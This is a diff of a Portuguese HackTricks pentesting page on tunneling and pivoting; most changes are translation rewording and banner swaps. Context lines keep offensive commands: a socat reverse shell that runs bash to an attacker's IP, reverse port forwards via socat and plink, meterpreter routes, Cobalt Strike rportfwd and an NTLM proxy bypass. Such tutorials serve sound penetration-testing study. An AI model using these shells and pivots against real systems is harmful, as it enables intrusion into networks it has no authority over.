@@ -2,12 +2,12 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 * Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
@@ -79,7 +79,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-É necessário **root em ambos os dispositivos** (pois você vai criar novas interfaces) e a configuração do sshd deve permitir login como root:\
+Você precisa de **root em ambos os dispositivos** (pois você vai criar novas interfaces) e a configuração do sshd deve permitir login de root:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -100,7 +100,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
-Você pode **tunelar** todo o **tráfego** para uma **sub-rede** através de um host usando **ssh**.\
+É possível **tunelar** todo o **tráfego** para uma **sub-rede** através de um host usando **ssh**.\
 Por exemplo, encaminhando todo o tráfego destinado a 10.10.10.0/24
 ```bash
 pip install sshuttle
@@ -122,7 +122,7 @@ portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 ```
 ### SOCKS
 
-SOCKS (Socket Secure) é um protocolo de rede que permite a comunicação de pacotes entre servidores através de um firewall. Ele pode ser usado para criar um túnel seguro para transferência de dados, contornando restrições de rede.
+SOCKS (Socket Secure) é um protocolo de rede que permite a comunicação de pacotes entre clientes e servidores através de um servidor proxy. Ele pode ser usado para rotear o tráfego da rede de um cliente através de um servidor intermediário para contornar restrições de firewall ou para manter a privacidade e o anonimato.
 ```bash
 background# meterpreter session
 route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
@@ -164,16 +164,10 @@ Neste caso, a **porta é aberta no host de beacon**, não no Servidor da Equipe 
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
-Para observar:
-
-- O encaminhamento de porta reversa do Beacon é projetado para **encaminhar o tráfego para o Servidor da Equipe, não para retransmitir entre máquinas individuais**.
-- O tráfego é **encaminhado dentro do tráfego C2 do Beacon**, incluindo links P2P.
-- **Privilégios de administrador não são necessários** para criar encaminhamentos de porta reversa em portas altas.
-
 ### rPort2Port local
 
 {% hint style="warning" %}
-Neste caso, a **porta é aberta no host do beacon**, não no Servidor da Equipe e o **tráfego é enviado para o cliente Cobalt Strike** (não para o Servidor da Equipe) e a partir daí para o host:porta indicado.
+Neste caso, a **porta é aberta no host do beacon**, não no Team Server e o **tráfego é enviado para o cliente Cobalt Strike** (não para o Team Server) e a partir daí para o host:porta indicado.
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -189,7 +183,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ```
 ## Chisel
 
-Você pode baixá-lo na página de lançamentos do [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
+Você pode baixá-lo na página de lançamentos de [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
 Você precisa usar a **mesma versão para cliente e servidor**
 
 ### socks
@@ -245,7 +239,7 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```bash
 socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
-### Porta a porta através de socks
+### Porta a Porta através de socks
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
@@ -285,7 +279,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Porta2Porta Remoto
 
-Conecte a porta SSH local (22) à porta 443 do host atacante
+Conecte a porta SSH local (22) à porta 443 do host do atacante
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -295,7 +289,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 É como uma versão de console do PuTTY (as opções são muito semelhantes a um cliente ssh).
 
-Como este binário será executado na vítima e é um cliente ssh, precisamos abrir nosso serviço ssh e porta para que possamos ter uma conexão reversa. Em seguida, para encaminhar apenas a porta acessível localmente para uma porta em nossa máquina:
+Como este binário será executado na vítima e é um cliente ssh, precisamos abrir nosso serviço ssh e porta para que possamos ter uma conexão reversa. Em seguida, encaminhe apenas a porta acessível localmente para uma porta em nossa máquina:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -333,7 +327,7 @@ Agora podemos **conectar** à **vítima** via **RDP** usando **`mstsc.exe`**, e 
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-Agora, confirme em sua máquina (atacante) que a porta 1080 está escutando:
+Agora, confirme em sua máquina (atacante) que a porta 1080 está ouvindo:
 ```
 netstat -antb | findstr 1080
 ```
@@ -341,9 +335,9 @@ Agora você pode usar [**Proxifier**](https://www.proxifier.com/) **para encamin
 
 ## Proxificar Aplicativos GUI do Windows
 
-Você pode fazer com que aplicativos GUI do Windows naveguem por um proxy usando [**Proxifier**](https://www.proxifier.com/).\
+Você pode fazer com que aplicativos GUI do Windows naveguem por meio de um proxy usando [**Proxifier**](https://www.proxifier.com/).\
 Em **Profile -> Proxy Servers** adicione o IP e a porta do servidor SOCKS.\
-Em **Profile -> Proxification Rules** adicione o nome do programa a ser proxificado e as conexões para os IPs que deseja proxificar.
+Em **Profile -> Proxification Rules** adicione o nome do programa para proxificar e as conexões para os IPs que deseja proxificar.
 
 ## Bypass de proxy NTLM
 
@@ -357,7 +351,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
 Autentica-se contra um proxy e vincula uma porta local que é encaminhada para o serviço externo que você especificar. Em seguida, você pode usar a ferramenta de sua escolha por meio desta porta.\
-Por exemplo, encaminha a porta 443.
+Por exemplo, encaminhar a porta 443.
 ```
 Username Alice
 Password P@ssw0rd
@@ -365,7 +359,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Agora, se você definir, por exemplo, na vítima o serviço **SSH** para escutar na porta 443. Você pode se conectar a ele através da porta 2222 do atacante.\
+Agora, se você definir, por exemplo, na vítima o serviço **SSH** para ouvir na porta 443. Você pode se conectar a ele através da porta 2222 do atacante.\
 Você também poderia usar um **meterpreter** que se conecta a localhost:443 e o atacante está ouvindo na porta 2222.
 
 ## YARP
@@ -520,12 +514,12 @@ addr: file:///tmp/httpbin/
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Aprenda hacking na AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Você trabalha em uma **empresa de cibersegurança**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me no** **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
